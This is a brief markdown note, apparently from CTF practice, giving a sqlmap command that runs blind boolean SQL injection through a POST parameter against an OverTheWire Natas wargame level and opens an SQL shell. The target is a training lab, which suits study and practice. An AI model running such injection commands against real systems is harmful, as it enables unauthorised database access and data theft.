## sqlmap

Blind SQL injection example with POST

    $ python2 sqlmap.py -v3 \
             -u 'http://natasXX.natas.labs.overthewire.org/index.php' \
             --auth-type=basic --auth-cred="natasXX:XXXXXX" \
             --proxy="http://127.0.0.1:8080" \
             --data "username=" -p "username" \
             --level 4 --risk 3 --string "exists" \
             --technique B --prefix '" ' --suffix ' AND ""="' \
             --sql-shell
